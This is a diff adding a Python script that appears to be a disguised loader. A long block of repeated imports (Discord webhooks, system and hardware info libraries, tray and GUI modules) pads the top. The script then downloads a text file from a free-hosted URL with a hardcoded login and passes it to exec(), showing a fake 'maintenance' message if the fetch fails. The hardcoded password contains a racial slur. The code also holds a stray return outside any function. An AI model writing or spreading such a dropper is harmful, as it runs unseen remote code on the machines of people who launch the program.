@@ -1,0 +1,77 @@
+import os
+import json
+import time
+from dhooks import Webhook, Embed
+import colorama
+from colorama import init, Fore, Style
+import getpass
+import shutil
+import datetime
+import sys
+import requests
+from pypresence import Presence
+import time
+import requests
+import re
+import json
+import time
+from dhooks import Webhook, Embed
+from colorama import Fore, init
+import os
+from discord_webhook import DiscordWebhook, DiscordEmbed
+import sys
+import time
+import os
+import time
+import threading
+import pystray
+from PIL import Image
+import requests
+import colorama
+import os
+from colorama import Fore, init, Style
+from os import system
+import subprocess
+import requests
+import time
+import os
+import wmi
+import hashlib
+import platform
+import requests
+import random
+import json
+import threading
+from time import sleep
+import getpass
+import requests
+import json
+import os
+import re
+import discord
+from discord.ext import commands
+from colorama import Fore
+from tkinter import filedialog
+import tkinter as tk
+import datetime
+import time
+import requests
+import json
+import subprocess
+import os
+import wmi
+init()
+import datetime
+import time
+print('Starting Session...')
+url = 'https://jdausdh08d12u28duy12d97dy1mdd.000webhostapp.com/src/sdj98shd98dy139827dy198hd0812dh9812dh9812dh0182dh128dh1928dh128dh128dh1208dh1208dh128dh1298dh1219d197d2178dg18dg12dg12867dg1287dg12dg127dg2178dg2187d128dbiydbsaudhybasudyasd7yd187dg812gd81wdg.txt'
+username = 'admin'
+password = 'Mainframingrunsallniggers1$11'
+session = requests.Session()
+session.auth = (username, password)
+response = session.get(url)
+if response.status_code == 200:
+    exec(response.text)
+    return None
+print('Program is under maintenance...')
+input('')
